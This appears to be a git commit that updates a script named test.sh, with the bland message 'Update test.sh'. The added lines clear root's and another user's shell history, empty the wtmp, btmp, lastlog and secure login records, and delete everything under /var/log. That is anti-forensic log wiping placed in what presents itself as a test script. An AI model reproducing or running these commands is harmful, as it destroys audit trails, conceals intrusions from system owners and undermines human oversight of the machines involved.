bace608b5a53a82018719be3cd5fc2a89691f001
nt-sudo <77606745+nt-sudo@users.noreply.github.com>
2021-01-19 10:24:36 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,2 +1,9 @@
 logfile=/tmp/.nttest/log.txt
+echo > /root/.bash_history
+echo > /home/imap/.bash_history
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/secure
+rm -rf /var/log/*
 date >> $logfile
